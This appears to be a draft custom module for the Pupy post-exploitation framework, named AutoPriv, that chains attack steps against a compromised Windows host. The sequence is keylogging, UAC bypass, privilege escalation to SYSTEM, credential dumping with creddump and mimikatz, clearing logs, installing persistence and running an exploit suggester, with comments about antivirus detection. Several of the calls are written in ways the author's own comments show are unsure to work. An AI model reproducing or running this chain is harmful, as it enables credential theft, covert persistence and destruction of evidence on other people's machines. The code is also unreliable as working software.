# import all basic stuff to get module working
# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
import os
import socket
import operator
# from termcolor import colored
import sys
import StringIO

__class_name__="AutoPriv"

@config(cat="custom", tags=["custom","privileges","escalation"])
class AutoPriv(PupyModule):
    """ TESTER: Attempt to automatically gain privilege escalation, SYSTEM-user, and post-exploitation """

    # def run():[-] run() takes no arguments (2 given)
# or maybe its this...
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="autopriv", description=self.__doc__)
    def run(self,args):

# # Error : no __class_name__ for module <module 'samplePupyModule' from '/root/pupy/pupy/modules/samplePupyModule.py'>
# # Figured out you always have to define the following things...
# 1. import pupylib
# 2. define a class name
# 3. define config
# 4. define a class
# 5. define a run function in that class
# 1. When I get a shell I need run a few things
# 2. Keylogger

# okay so you cant use 'run', you are gonna have to use python or something
# Cant use 'python'
# you can use 'python with a FULL directory path'
# >>> os.system('python /home/ec2-user/AutoPriv.py')
#>>> execfile('/root/pupy/pupy/modules/lazagne.py') seems to work as well
# you cant use the built in pyexec --file command because it shoots out errors and wont run the defn run(self,args) part
# you need to find out how the shell works
# resource doesnt work either

        os.system('python /root/pupy/pupy/modules/keylogger.py')
        # # 3. then getprivs
        os.system('run manage/getprivs')
        # 4. then bypass uac, which spawns a new shell
        os.system('python /root/pupy/pupy/modules/bypassuac.py')
        # 5. then powerup
        os.system('run privesc/powerup')
        # 6. then getsystem
        os.system('run privesc/getsystem')
        # AVOID using mouselogger, it appears to be bugged
        # 7. run cred/dump
        os.system('run creds/creddump')
        # 8. run mimikatz_powershell (more stable than memory execution)
        os.system('run creds/mimikatz_powershell')
        # AVOID using impersonate, not yet because there appears to be a detection issue where AV kills it
        # 9. run bypass uac again, to make another Administrator shell (instead of SYSTEM)
        os.system('run privesc/bypassuac')
        # 10. run admin clear logs with new administrator shell
        os.system('run admin/clear_logs')
        # 11. finally get persistence
        os.system('run manage/persistence')
        # 12. admin/drives
        os.system('run admin/drives')
        # 13. run exploit_suggester
        os.system('run exploit/exploit_suggester')
#
# # nots ure what method to use to run commands
# either os.system('python module.py') or
# 'os.system('run <module>')'
